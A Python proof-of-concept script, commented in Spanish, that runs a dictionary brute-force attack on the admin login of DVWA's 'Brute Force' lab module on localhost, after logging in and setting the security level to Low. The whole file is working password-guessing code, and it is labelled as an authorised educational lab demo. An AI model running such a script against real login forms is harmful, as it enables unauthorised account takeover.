#!/usr/bin/env python3
# ---------------------------------------------------------------
# PoC EDUCATIVA - Ataque de fuerza bruta contra el modulo
# "Brute Force" de DVWA (laboratorio local, 100% autorizado).
#
# Demuestra que la aplicacion NO limita los intentos de login,
# por lo que se puede probar una lista de contrasenas hasta dar
# con la correcta.
#
# Uso:  python3 fuerza_bruta.py
# ---------------------------------------------------------------
import urllib.request, urllib.parse, http.cookiejar, re, sys

BASE = "http://localhost:8080"
USER = "admin"

# Lista pequena de contrasenas comunes (diccionario). Incluye la
# correcta al final solo para la demostracion del laboratorio.
WORDLIST = ["123456", "admin", "root", "letmein", "qwerty", "iloveyou",
            "dragon", "monkey", "football", "abc123", "123456789",
            "welcome", "login", "princess", "passw0rd", "password"]

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def get(url):
    return opener.open(url, timeout=10).read().decode("utf-8", "ignore")

def post(url, data):
    body = urllib.parse.urlencode(data).encode()
    return opener.open(url, body, timeout=10).read().decode("utf-8", "ignore")

def token(html):
    m = re.search(r"name=['\"]user_token['\"][^>]*value=['\"]([0-9a-f]+)['\"]", html)
    return m.group(1) if m else ""

print("[*] Autenticando en DVWA y poniendo seguridad en Low...")
try:
    post(BASE + "/login.php", {"username": "admin", "password": "password",
                               "user_token": token(get(BASE + "/login.php")), "Login": "Login"})
    post(BASE + "/security.php", {"security": "low", "seclev_submit": "Submit",
                                  "user_token": token(get(BASE + "/security.php"))})
except Exception as e:
    print("[!] No pude conectar con DVWA en", BASE, "->", e)
    sys.exit(1)

print(f"[*] Iniciando fuerza bruta sobre el usuario '{USER}' ({len(WORDLIST)} contrasenas)\n")
found = None
for i, pw in enumerate(WORDLIST, 1):
    q = urllib.parse.urlencode({"username": USER, "password": pw, "Login": "Login"})
    html = get(BASE + "/vulnerabilities/brute/?" + q)
    ok = "Welcome to the password protected area" in html
    print(f"  [{i:02d}] {USER}:{pw:<12} -> {'EXITO <<<' if ok else 'incorrecto'}")
    if ok:
        found = pw
        break

print()
if found:
    print(f"[+] CONTRASENA ENCONTRADA:  {USER} : {found}")
    print("[+] La aplicacion no bloqueo ninguno de los intentos.")
else:
    print("[-] No se encontro la contrasena en el diccionario.")
